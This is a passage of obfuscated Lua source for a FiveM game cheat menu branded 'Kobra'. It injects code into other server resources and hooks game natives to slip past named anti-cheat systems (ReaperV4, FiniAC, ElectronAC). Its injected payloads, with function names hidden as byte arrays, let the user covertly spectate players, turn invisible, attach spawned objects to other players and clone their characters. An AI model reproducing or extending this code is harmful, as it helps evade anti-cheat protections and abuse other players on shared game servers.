                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    CreateRadioObject(model, coords, function(entity)
                        print(entity)
                    end)
                end
                spawnObj()
            ]],v214,v334));v216=v216 + (1 -0) ;break;end end else local v1335=0 -0 ;while true do if (v1335==(0 + 0)) then MachoInjectResourceRaw("any",string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and GetHashKey(model) or model
                RequestModel(hash)
                local attempts = 0
                while not HasModelLoaded(hash) and attempts < 20 do
                    Citizen.Wait(100)
                    attempts = attempts + 1
                end
                if attempts >= 20 then return end
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                    SetModelAsNoLongerNeeded(hash)
                end
            ]],v215,v334));v216=v216 + 1 ;break;end end end end v212:Notify("success","Kobra",string.format("Object '%s' spawned on %d/%d player(s)!",v214,v216, #v213),18471 -13471 );end;v12.HandleSpectateToggle=function(v217,v218,v219) local v220=0;local v221;local v222;while true do if (v220==(3 -0)) then if v222 then local v736=0 -0 ;local v737;local v738;local v739;while true do if (v736==(1949 -(414 + 1533))) then if v738 then local v1133=0;local v1134;local v1135;while true do if ((0 + 0)==v1133) then v1134,v1135=pcall(v738);if  not v1134 then local v1400=0;while true do if (v1400==(555 -(443 + 112))) then print("[ReaperV4 Spectate] Execution error:",v1135);v217:Notify("error","Kobra","Failed to execute spectate code!",4479 -(888 + 591) );break;end end else print("[ReaperV4 Spectate] Code executed successfully");end break;end end else local v1136=0;while true do if (v1136==(0 -0)) then print("[ReaperV4 Spectate] Load error:",v739);v217:Notify("error","Kobra","Failed to load spectate code!",3000);break;end end end break;end if (v736==0) then print("Spectate Fallback #3 (ReaperV4 detected, running direct)");if  not GetPlayerName(GetPlayerFromServerId(v221)) then local v1137=0 + 0 ;while true do if (v1137==(3 -2)) then return;end if (v1137==(0 + 0)) then v217:Notify("error","Kobra","Target player not found!",1452 + 1548 );print("[ReaperV4 Spectate] Error: No player found for server ID:",v221);v1137=1 + 0 ;end end end v736=1 -0 ;end if (v736==1) then v737=string.format([[
            local function HookNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    print("[ReaperV4 Spectate] Warning: Native " .. nativeName .. " not found or not a function")
                    return
                end
                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                if not f then print("[ReaperV4 Spectate] Error: Global function " .. k .. " not found") end
                return f
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            local function _t()
                local createThread = _G[_d(_b("CreateThread"))]
                if not createThread then print("[ReaperV4 Spectate] Error: CreateThread not found") end
                return createThread
            end
            HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
            HookNative("NetworkSetInSpectatorMode", function(originalFn, ...) return originalFn(...) end)
            HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
            HookNative("NetworkSetEntityInvisibleToNetwork", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
            HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
            HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            local function findClientIdByServerId(sid)
                local players = _g(_b("GetActivePlayers"))()
                if not players then
                    print("[ReaperV4 Spectate] Error: GetActivePlayers returned nil")
                    return -1
                end
                print("[ReaperV4 Spectate] Active players:", table.concat(players, ", "))
                for _, pid in ipairs(players) do
                    local serverId = _g(_b("GetPlayerServerId"))(pid)
                    print("[ReaperV4 Spectate] Player Client ID:", pid, "Server ID:", serverId)
                    if serverId == sid then
                        print("[ReaperV4 Spectate] Found client ID:", pid, "for server ID:", sid)
                        return pid
                    end
                end
                print("[ReaperV4 Spectate] Error: No client ID found for server ID:", sid)
                return -1
            end
            local function stopSpectate()
                if not _G.osintSpectate or not _G.osintSpectate.enabled then
                    print("[ReaperV4 Spectate] StopSpectate: Not currently spectating")
                    return
                end
                local me = _g(_b("PlayerPedId"))()
                if not me then
                    print("[ReaperV4 Spectate] Error: PlayerPedId returned nil")
                    return
                end
                local back = _G.osintSpectate.back
                local heading = _G.osintSpectate.heading
                local wasVisible = _G.osintSpectate.wasVisible
                if back then
                    _g(_b("RequestCollisionAtCoord"))(back.x, back.y, back.z)
                end
                local success, err = pcall(function()
                    _g(_b("NetworkSetInSpectatorMode"))(false, me)
                end)
                if not success then
                    print("[ReaperV4 Spectate] Error: NetworkSetInSpectatorMode failed:", err)
                end
                _g(_b("FreezeEntityPosition"))(me, false)
                if back then
                    _g(_b("SetEntityCoords"))(me, back.x, back.y, back.z, false, false, false, true)
                end
                if heading then
                    _g(_b("SetEntityHeading"))(me, heading)
                end
                _g(_b("SetEntityCollision"))(me, true, true)
                _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                _g(_b("SetEntityInvincible"))(me, false)
                _G.osintSpectate.enabled = false
                _G.osintSpectate.targetSid = nil
                print("[ReaperV4 Spectate] Stopped spectating")
            end
            local function startSpectate(targetSid)
                local me = _g(_b("PlayerPedId"))()
                if not me then
                    print("[ReaperV4 Spectate] Error: PlayerPedId returned nil")
                    return
                end
                local myCoords = _g(_b("GetEntityCoords"))(me)
                if not myCoords then
                    print("[ReaperV4 Spectate] Error: GetEntityCoords returned nil")
                    return
                end
                local myHeading = _g(_b("GetEntityHeading"))(me)
                if not _G.osintSpectate then _G.osintSpectate = {} end
                _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z - 1.0)
                _G.osintSpectate.heading = myHeading
                _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                _G.osintSpectate.enabled = true
                _G.osintSpectate.targetSid = targetSid
                local clientId = findClientIdByServerId(targetSid)
                local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                if clientId == -1 or targetPed == 0 then
                    print("[ReaperV4 Spectate] Error: Invalid client ID or target ped not found for server ID:", targetSid)
                    _G.osintSpectate.enabled = false
                    TriggerEvent('Kobra:Notify', "error", "Kobra", "Target player not found!", 3000)
                    return
                end
                local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                if not tCoords then
                    print("[ReaperV4 Spectate] Error: GetEntityCoords for target ped returned nil")
                    _G.osintSpectate.enabled = false
                    TriggerEvent('Kobra:Notify', "error", "Kobra", "Failed to get target position!", 3000)
                    return
                end
                _g(_b("RequestCollisionAtCoord"))(tCoords.x, tCoords.y, tCoords.z)
                _g(_b("SetEntityVisible"))(me, false, false)
                _g(_b("SetEntityCollision"))(me, false, false)
                _g(_b("NetworkSetEntityInvisibleToNetwork"))(me, true)
                _g(_b("SetEntityInvincible"))(me, true)
                local zOffset = 15.0 -- Default offset since GetGroundZFor_3dCoord is unavailable
                _g(_b("SetEntityCoords"))(me, tCoords.x, tCoords.y, tCoords.z + zOffset, false, false, false, true)
                _w(300)
                _g(_b("FreezeEntityPosition"))(me, true)
                local success, err = pcall(function()
                    _g(_b("NetworkSetInSpectatorMode"))(true, targetPed)
                end)
                if not success then
                    print("[ReaperV4 Spectate] Error: NetworkSetInSpectatorMode failed:", err)
                    _G.osintSpectate.enabled = false
                    TriggerEvent('Kobra:Notify', "error", "Kobra", "Spectator mode not supported!", 3000)
                    return
                end
                print("[ReaperV4 Spectate] Started spectating server ID:", targetSid, "on ped:", targetPed)
                _t()(function()
                    while _G.osintSpectate and _G.osintSpectate.enabled do
                        local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                        if cid == -1 then
                            print("[ReaperV4 Spectate] Error: Client ID not found in loop for server ID:", targetSid)
                            break
                        end
                        local ped = _g(_b("GetPlayerPed"))(cid)
                        if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then
                            print("[ReaperV4 Spectate] Error: Target ped not found or does not exist")
                            break
                        end
                        local pc = _g(_b("GetEntityCoords"))(ped)
                        if not pc then
                            print("[ReaperV4 Spectate] Error: GetEntityCoords returned nil in loop")
                            break
                        end
                        _g(_b("SetEntityCoords"))(me, pc.x, pc.y, pc.z + zOffset, false, false, false, true)
                        _w(400)
                    end
                    stopSpectate()
                end)
            end
            local enable = %s
            local sid = %d
            if enable then
                print("[ReaperV4 Spectate] Starting spectate for server ID:", sid)
                startSpectate(sid)
            else
                print("[ReaperV4 Spectate] Stopping spectate")
                stopSpectate()
            end
        ]],tostring(v219),v221);v738,v739=load(v737);v736=2;end end elseif ((GetResourceState("FiniAC")=="started") or (GetResourceState("ElectronAC")=="started")) then local v904=0 -0 ;while true do if (v904==(1678 -(136 + 1542))) then print("Spectate Fallback #1");MachoInjectResourceRaw("any",string.format([[
                local function HookNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end
                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end
                local function _w(n)
                    return Citizen.Wait(n)
                end
                local function _t()
                    return _G[_d(_b("CreateThread"))]
                end
                HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetGroundZFor_3dCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                HookNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                HookNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                HookNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                local function Clamp(val, min, max)
                    if val < min then return min end
                    if val > max then return max end
                    return val
                end
                local function findClientIdByServerId(sid)
                    local players = _g(_b("GetActivePlayers"))()
                    for _, pid in ipairs(players) do
                        if _g(_b("GetPlayerServerId"))(pid) == sid then
                            return pid
                        end
                    end
                    return -1
                end
                local function stopSpectate()
                    if not _G.osintSpectate or not _G.osintSpectate.enabled then return end
                    local me = _g(_b("PlayerPedId"))()
                    local back = _G.osintSpectate.back
                    local heading = _G.osintSpectate.heading
                    local wasVisible = _G.osintSpectate.wasVisible
                    if _G.osintSpectate.camera then
                        _g(_b("RenderScriptCams"))(false, false, 0, true, true)
                        _g(_b("DestroyCam"))(_G.osintSpectate.camera, false)
                        _G.osintSpectate.camera = nil
                    end
                    if back then _g(_b("RequestCollisionAtCoord"))(back) end
                    _g(_b("FreezeEntityPosition"))(me, false)
                    if back then
                        local valid, groundZ = _g(_b("GetGroundZFor_3dCoord"))(back.x, back.y, back.z, false)
                        local targetCoords = valid and vector3(back.x, back.y, groundZ + 1.0) or back
                        _g(_b("SetEntityCoords"))(me, targetCoords.x, targetCoords.y, targetCoords.z, false, false, false, true)
                    end
                    if heading then _g(_b("SetEntityHeading"))(me, heading) end
                    _g(_b("SetEntityCollision"))(me, true, true)
                    _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                    _G.osintSpectate.enabled = false
                    _G.osintSpectate.targetSid = nil
                    _g(_b("SetFocusEntity"))(me)
                end
                local function startSpectate(targetSid)
                    local me = _g(_b("PlayerPedId"))()
                    local myCoords = _g(_b("GetEntityCoords"))(me)
                    local myHeading = _g(_b("GetEntityHeading"))(me)
                    if not _G.osintSpectate then _G.osintSpectate = {} end
                    _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z)
                    _G.osintSpectate.heading = myHeading
                    _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                    _G.osintSpectate.enabled = true
                    _G.osintSpectate.targetSid = targetSid
                    local clientId = findClientIdByServerId(targetSid)
                    local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                    if clientId == -1 or targetPed == 0 then
                        _G.osintSpectate.enabled = false
                        return
                    end
                    local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                    _g(_b("RequestCollisionAtCoord"))(tCoords)
                    _g(_b("SetEntityVisible"))(me, false, false)
                    _g(_b("SetEntityCollision"))(me, false, false)
                    _g(_b("SetEntityInvincible"))(me, true)
                    local zOffset = 3.0
                    local cam = _g(_b("CreateCam"))("DEFAULT_SCRIPTED_CAMERA", true)
                    _G.osintSpectate.camera = cam
                    _g(_b("SetCamCoord"))(cam, tCoords.x, tCoords.y, tCoords.z + zOffset)
                    _g(_b("SetCamRot"))(cam, -30.0, 0.0, _g(_b("GetEntityHeading"))(targetPed), 2)
                    _g(_b("RenderScriptCams"))(true, false, 0, true, true)
                    _t()(function()
                        local cameraReady = false
                        _w(550)
                        cameraReady = true
                        while _G.osintSpectate and _G.osintSpectate.enabled and cameraReady do
                            local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                            if cid == -1 then break end
                            local ped = _g(_b("GetPlayerPed"))(cid)
                            if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then break end
                            local pc = _g(_b("GetEntityCoords"))(ped)
                            _g(_b("SetCamCoord"))(cam, pc.x, pc.y, pc.z + zOffset)
                            local camRot = _g(_b("GetCamRot"))(cam, 2)
                            local x = _g(_b("GetDisabledControlNormal"))(0, 1)
                            local y = _g(_b("GetDisabledControlNormal"))(0, 2)
                            local newPitch = Clamp(camRot.x - y * 5, -89.0, 89.0)
                            local newYaw = camRot.z - x * 5
                            _g(_b("SetCamRot"))(cam, newPitch, camRot.y, newYaw, 2)
                            _g(_b("SetFocusPosAndVel"))(pc.x, pc.y, pc.z, 0.0, 0.0, 0.0)
                            _w(0)
                        end
                        stopSpectate()
                    end)
                end
                local enable = %s
                local sid = %d
                if enable then
                    startSpectate(sid)
                else
                    stopSpectate()
                end
            ]],tostring(v219),v221));break;end end else local v905=0 -0 ;while true do if (v905==0) then print("Spectate Fallback #2");MachoInjectResourceRaw("monitor",string.format([[
                local function HookNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end
                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end
                local function _w(n)
                    return Citizen.Wait(n)
                end
                local function _t()
                    return _G[_d(_b("CreateThread"))]
                end
                HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("NetworkSetInSpectatorMode", function(originalFn, ...) return originalFn(...) end)
                HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("NetworkSetEntityInvisibleToNetwork", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetGroundZFor_3dCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                local function findClientIdByServerId(sid)
                    local players = _g(_b("GetActivePlayers"))()
                    for _, pid in ipairs(players) do
                        if _g(_b("GetPlayerServerId"))(pid) == sid then
                            return pid
                        end
                    end
                    return -1
                end
                local function stopSpectate()
                    if not _G.osintSpectate or not _G.osintSpectate.enabled then return end
                    local me = _g(_b("PlayerPedId"))()
                    local back = _G.osintSpectate.back
                    local heading = _G.osintSpectate.heading
                    local wasVisible = _G.osintSpectate.wasVisible
                    if back then _g(_b("RequestCollisionAtCoord"))(back) end
                    _g(_b("NetworkSetInSpectatorMode"))(false, me)
                    _g(_b("FreezeEntityPosition"))(me, false)
                    if back then _g(_b("SetEntityCoords"))(me, back.x, back.y, back.z, false, false, false, true) end
                    if heading then _g(_b("SetEntityHeading"))(me, heading) end
                    _g(_b("SetEntityCollision"))(me, true, true)
                    _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                    _G.osintSpectate.enabled = false
                    _G.osintSpectate.targetSid = nil
                end
                local function startSpectate(targetSid)
                    local me = _g(_b("PlayerPedId"))()
                    local myCoords = _g(_b("GetEntityCoords"))(me)
                    local myHeading = _g(_b("GetEntityHeading"))(me)
                    if not _G.osintSpectate then _G.osintSpectate = {} end
                    _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z - 1.0)
                    _G.osintSpectate.heading = myHeading
                    _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                    _G.osintSpectate.enabled = true
                    _G.osintSpectate.targetSid = targetSid
                    local clientId = findClientIdByServerId(targetSid)
                    local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                    if clientId == -1 or targetPed == 0 then
                        _G.osintSpectate.enabled = false
                        return
                    end
                    local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                    _g(_b("RequestCollisionAtCoord"))(tCoords)
                    _g(_b("SetEntityVisible"))(me, false, false)
                    _g(_b("SetEntityCollision"))(me, false, false)
                    _g(_b("NetworkSetEntityInvisibleToNetwork"))(me, true)
                    _g(_b("SetEntityInvincible"))(me, true)
                    local groundZ = tCoords.z
                    local foundGround, zPos = _g(_b("GetGroundZFor_3dCoord"))(tCoords.x, tCoords.y, tCoords.z, false)
                    if foundGround then
                        groundZ = zPos
                    end
                    local zOffset = math.max(15.0, tCoords.z - groundZ + 5.0)
                    _g(_b("SetEntityCoords"))(me, tCoords.x, tCoords.y, tCoords.z - zOffset, false, false, false, true)
                    _w(300)
                    _g(_b("FreezeEntityPosition"))(me, true)
                    _g(_b("NetworkSetInSpectatorMode"))(true, targetPed)
                    _t()(function()
                        while _G.osintSpectate and _G.osintSpectate.enabled do
                            local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                            if cid == -1 then break end
                            local ped = _g(_b("GetPlayerPed"))(cid)
                            if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then break end
                            local pc = _g(_b("GetEntityCoords"))(ped)
                            local groundZ = pc.z
                            local foundGround, zPos = _g(_b("GetGroundZFor_3dCoord"))(pc.x, pc.y, pc.z, false)
                            if foundGround then
                                groundZ = zPos
                            end
                            local zOffset = math.max(15.0, pc.z - groundZ + 5.0)
                            _g(_b("SetEntityCoords"))(me, pc.x, pc.y, pc.z - zOffset, false, false, false, true)
                            _w(400)
                        end
                        stopSpectate()
                    end)
                end
                local enable = %s
                local sid = %d
                if enable then
                    startSpectate(sid)
                else
                    stopSpectate()
                end
            ]],tostring(v219),v221));break;end end end break;end if ((2 + 0)==v220) then if v219 then v217:Notify("success","Kobra",("You have started spectating the player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(v221)) or "Unknown" ,v221),4770 -1770 );else v217:Notify("error","Kobra",("You have stopped spectating the player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(v221)) or "Unknown" ,v221),2172 + 828 );end v222=GetResourceState("ReaperV4")=="started" ;v220=489 -(68 + 418) ;end if ((2 -1)==v220) then if  not v221 then local v740=0;while true do if (v740==(0 -0)) then v217:Notify("error","Kobra","Invalid server ID format!",3000);return;end end end if (v221==tonumber(GetPlayerServerId(PlayerId()))) then local v741=0;while true do if (v741==(0 + 0)) then v217:Notify("error","Kobra","You cannot spectate yourself!",4092 -(770 + 322) );return;end end end v220=1 + 1 ;end if (v220==(0 + 0)) then if  not v218 then local v742=0 + 0 ;while true do if (v742==(0 -0)) then v217:Notify("error","Kobra","Invalid player ID provided!",5817 -2817 );return;end end end v221=tonumber(v218);v220=2 -1 ;end end end;local v74={"envi-medic","envi-hud","envi-yoga","envi-chopshop","envi-chopshop-v2","envi-foodtrucks","envi-dumpsters","envi-prescriptions","envi-druglabs","lation_laundering"};local function v75() local v223=0 -0 ;while true do if (v223==0) then for v646,v647 in ipairs(v74) do if (GetResourceState(v647)=="started") then return v647;end end return nil;end end end local v76=nil;if ((GetResourceState("es_extended")=="started") and (GetResourceState("timeless-emotes")=="started")) then v76="es_extended";elseif ((GetResourceState("core")=="started") and (GetResourceState("timeless-emotes")=="started")) then v76="core";end v12.EnableInvisibility=function(v224) local v225=0;local v226;while true do if (v225==(2 -0)) then v226("IsEntityVisible",function(v648,...) return true;end);v226("IsEntityVisibleToScript",function(v649,...) return true;end);v225=2 + 1 ;end if (v225==(18 -14)) then if  not _G.osintInvisibility.enabled then local v743=0;local v744;while true do if (v743==(6 -4)) then CreateThread(function() while _G.osintInvisibility and _G.osintInvisibility.enabled  do local v1138=0 + 0 ;local v1139;while true do if ((0 -0)==v1138) then v1139=PlayerPedId();if (v1139 and DoesEntityExist(v1139)) then SetEntityVisible(v1139,false,false);end v1138=1;end if (v1138==(832 -(762 + 69))) then Wait(1619 -1119 );break;end end end end);break;end if ((1 + 0)==v743) then _G.osintInvisibility.wasVisible=IsEntityVisible(v744);SetEntityVisible(v744,false,false);v743=2 + 0 ;end if (0==v743) then _G.osintInvisibility.enabled=true;v744=PlayerPedId();v743=1;end end end break;end if (v225==0) then v226=nil;function v226(v650,v651) local v652=0;local v653;while true do if (v652==(2 -1)) then _G[v650]=function(...) return v651(v653,...);end;break;end if (v652==(0 + 0)) then v653=_G[v650];if ( not v653 or (type(v653)~="function")) then return;end v652=1 + 0 ;end end end v225=1;end if (v225==(11 -8)) then v226("SetEntityVisible",function(v654,v655,v656,v657) local v658=157 -(8 + 149) ;while true do if (v658==0) then if (_G.osintInvisibility and _G.osintInvisibility.enabled) then return v654(v655,false,v657);end return v654(v655,v656,v657);end end end);if  not _G.osintInvisibility then _G.osintInvisibility={enabled=false,wasVisible=true};end v225=1324 -(1199 + 121) ;end if (v225==(1 -0)) then v226("CreateThread",function(v659,...) return v659(...);end);v226("PlayerPedId",function(v660,...) return v660(...);end);v225=4 -2 ;end end end;v12.DisableInvisibility=function(v227) if (_G.osintInvisibility and _G.osintInvisibility.enabled) then local v531=0 + 0 ;local v532;while true do if (v531==(0 -0)) then _G.osintInvisibility.enabled=false;v532=PlayerPedId();v531=2 -1 ;end if (v531==(1 + 0)) then if (v532 and DoesEntityExist(v532)) then SetEntityVisible(v532,_G.osintInvisibility.wasVisible,false);end break;end end end end;v12.HandleAttackClonePlayer=function(v228,v229) local v230=1807 -(518 + 1289) ;local v231;while true do if (v230==1) then MachoHookNative(2596915000000000000,function(v661) return true,v661;end);MachoHookNative(15321135000000000000,function(v662,v663,v664,v665,v666,v667,v668) return true,v662,v663,v664,v665,v666,v667,v668;end);v230=2 -0 ;end if (v230==(1 + 1)) then MachoInjectResourceRaw("monitor",string.format([[
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function g(n)
            return _G[decode(n)]
        end
        local function wait(n)
            return Citizen.Wait(n)
        end
        local function findClientIdByServerId(sid)
            local players = g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
            for _, pid in ipairs(players) do
                if g({71,101,116,80,108,97,121,101,114,83,101,114,118,101,114,73,100})(pid) == sid then
                    return pid
                end
            end
            return nil
        end
        local function copyPedAppearance(sourcePed, targetPed)
            for i = 0, 11 do
                local drawable = g({71,101,116,80,101,100,68,114,97,119,97,98,108,101,86,97,114,105,97,116,105,111,110})(sourcePed, i)
                local texture = g({71,101,116,80,101,100,84,101,120,116,117,114,101,86,97,114,105,97,116,105,111,110})(sourcePed, i)
                g({83,101,116,80,101,100,67,111,109,112,111,110,101,110,116,86,97,114,105,97,116,105,111,110})(targetPed, i, drawable, texture, 2)
            end
            for i = 0, 7 do
                local propIndex = g({71,101,116,80,101,100,80,114,111,112,73,110,100,101,120})(sourcePed, i)
                local propTexture = g({71,101,116,80,101,100,80,114,111,112,84,101,120,116,117,114,101,73,110,100,101,120})(sourcePed, i)
                if propIndex ~= -1 then
                    g({83,101,116,80,101,100,80,114,111,112})(targetPed, i, propIndex, propTexture)
                else
                    g({67,108,101,97,114,80,101,100,80,114,111,112})(targetPed, i)
                end
            end
            local headBlendData = {g({71,101,116,80,101,100,72,101,97,100,66,108,101,110,100,68,97,116,97})(sourcePed)}
            if headBlendData[1] then
                g({83,101,116,80,101,100,72,101,97,100,66,108,101,110,100,68,97,116,97})(
                    targetPed,
                    headBlendData[2], -- shapeFirst
                    headBlendData[3], -- shapeSecond
                    headBlendData[4], -- shapeThird
                    headBlendData[5], -- skinFirst
                    headBlendData[6], -- skinSecond
                    headBlendData[7], -- skinThird
                    headBlendData[8], -- shapeMix
                    headBlendData[9], -- skinMix
                    headBlendData[10] -- thirdMix
                )
            end
        end
        local function clonePed(ped)
            local coords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
            local heading = g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})(ped)
            local modelHash = g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(ped)
            g({82,101,113,117,101,115,116,77,111,100,101,108})(modelHash)
            local timeout = 0
            while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) and timeout < 500 do
                wait(10)
                timeout = timeout + 1
            end
            if not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) then return end
            -- Spawn ped 2 units away from player
            local spawnRadius = 2.0
            local spawnX = coords.x + (math.random() * 2 - 1) * spawnRadius
            local spawnY = coords.y + (math.random() * 2 - 1) * spawnRadius
            local spawnZ = coords.z
            local clone = g({67,114,101,97,116,101,80,101,100})(4, modelHash, spawnX, spawnY, spawnZ, heading, true, true)
            if clone and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(clone) then
                copyPedAppearance(ped, clone)
                g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})(clone, true, true)
                g({83,101,116,77,111,100,101,108,65,115,78,111,76,111,110,103,101,114,78,101,101,100,101,100})(modelHash)
